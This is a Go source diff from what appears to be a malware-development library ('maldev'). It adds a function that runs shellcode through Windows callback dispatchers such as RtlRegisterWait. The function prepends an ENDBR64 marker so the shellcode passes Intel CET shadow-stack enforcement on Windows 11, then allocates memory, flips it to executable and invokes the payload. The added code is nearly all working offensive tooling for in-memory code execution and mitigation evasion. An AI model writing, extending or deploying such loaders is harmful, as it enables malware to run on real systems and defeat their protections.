@@ -8,9 +8,48 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/evasion/cet"
 	"github.com/oioio-space/maldev/win/api"
 	"golang.org/x/sys/windows"
 )
+
+// MethodEnforcesCET reports whether the supplied callback method
+// dispatches through a path that Win11+ enforces with Intel CET
+// shadow-stacks (KiUserApcDispatcher / threadpool wait dispatcher).
+// Use it to decide whether to ENDBR64-prefix the shellcode before
+// passing it to ExecuteCallback.
+func MethodEnforcesCET(m CallbackMethod) bool {
+	return m == CallbackRtlRegisterWait || m == CallbackNtNotifyChangeDirectory
+}
+
+// ExecuteCallbackBytes is the CET-aware wrapper around
+// ExecuteCallback. It transparently:
+//
+//   1. Checks [MethodEnforcesCET](method) AND
+//      [cet.Enforced]() and, when both hold, prepends the ENDBR64
+//      marker (`F3 0F 1E FA`) so the dispatcher accepts the
+//      callback under Win11+ shadow-stack enforcement.
+//   2. Allocates a local RW page, copies the prepared shellcode,
+//      flips it to RX via VirtualProtect.
+//   3. Calls ExecuteCallback(addr, method) and returns its error.
+//
+// The allocation is intentionally retained — long-lived methods
+// (RtlRegisterWait wakes on every signal in some patterns) may
+// re-enter the callback after this function returns. Callers that
+// know the callback fired exactly once can free it themselves.
+//
+// On hosts where CET is not enforced, the helper is equivalent to a
+// plain alloc + ExecuteCallback chain.
+func ExecuteCallbackBytes(sc []byte, method CallbackMethod) error {
+	if MethodEnforcesCET(method) && cet.Enforced() {
+		sc = cet.Wrap(sc)
+	}
+	addr, err := allocateAndWriteMemoryLocalWithCaller(sc, nil)
+	if err != nil {
+		return fmt.Errorf("ExecuteCallbackBytes: alloc: %w", err)
+	}
+	return ExecuteCallback(addr, method)
+}
 
 // CallbackMethod identifies the callback technique used for shellcode execution.
 type CallbackMethod int
